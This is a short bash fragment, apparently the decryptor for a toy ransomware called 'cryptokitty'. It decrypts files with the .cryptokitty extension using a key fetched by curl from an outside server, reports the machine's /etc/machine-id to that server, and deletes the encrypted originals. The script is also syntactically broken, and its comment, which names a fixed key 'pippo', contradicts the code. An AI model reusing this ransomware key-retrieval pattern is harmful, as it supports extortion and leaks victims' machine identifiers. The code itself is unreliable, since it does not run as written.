#file in the first argument
if [[ "${f##*\\.}" == "*.cryptokitty" ]] then
$f = ${$1%.cryptokitty}
echo $f 
#i decrypt the files with extension .cryptokitty and i use the key "pippo", then i remove the crypted files leaving only the clear text ones
[ -f $f ] && openssl enc -d -aes-256-cbc -in $f -k "\$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$1)\" -out ${f%.cryptokitty} ; rm $f
fi
